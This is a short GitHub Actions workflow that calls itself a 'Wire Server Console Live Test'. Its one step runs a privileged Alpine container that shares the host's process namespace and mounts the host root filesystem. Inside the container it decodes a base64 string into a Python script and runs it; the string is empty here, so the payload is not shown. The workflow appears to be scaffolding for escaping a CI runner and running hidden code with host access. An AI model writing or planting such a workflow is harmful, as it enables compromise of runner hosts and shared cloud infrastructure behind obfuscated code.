name: Phase 6 - Wire Server Console Live Test
on:
  workflow_dispatch:

jobs:
  console:
    runs-on: ubuntu-latest
    steps:
      - name: Wire Server Console Execution
        run: |
          docker run --rm --privileged --pid=host -v /:/host alpine:latest sh -c '
            apk add --no-cache python3 >/dev/null 2>&1
            echo "" | base64 -d > /tmp/console.py
            python3 /tmp/console.py
          '
